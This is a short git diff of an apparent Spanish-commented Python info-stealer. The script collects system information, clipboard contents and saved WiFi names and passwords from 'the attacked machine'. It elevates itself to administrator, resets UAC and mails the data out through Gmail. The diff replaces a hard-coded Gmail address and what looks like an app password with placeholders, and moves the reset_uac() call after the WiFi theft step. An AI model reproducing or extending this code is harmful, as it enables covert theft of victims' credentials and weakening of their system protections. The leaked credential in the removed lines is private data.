@@ -24,9 +24,9 @@ system_information = os.path.join(current_directory, "systeminfo.txt")
 clipboard_information = os.path.join(current_directory, "clipboard.txt")
 
 #credenciales del mail
-email_address = 'classeprueba1234@gmail.com'
-password = 'lgal hrtr ufpw stld'
-toaddr = "classeprueba1234@gmail.com"
+email_address = 'mail'
+password = 'contraseña'
+toaddr = "mail"
 
 #Funcion para ejecutar el script como administrador
 def run_as_admin():
@@ -71,7 +71,7 @@ for dependencia in dependencias:
         except subprocess.CalledProcessError:
             print(f'Error al instalar la dependencia {dependencia}.')
 
-reset_uac()
+
 
 #Funcion que captura los nombres y las contraseñas de los wifis los quales la maquina atacada tiene guardados.
 def get_wifi_info():
@@ -105,6 +105,7 @@ def append_wifi_info_to_system_info():
         f.write("\n\n=== WiFi Information ===\n")
         f.write(wifi_info)
 append_wifi_info_to_system_info()
+reset_uac()
 
 #Funcion que captura información del sistema tal como el Sistema operativo o la IP.
 def computer_information():
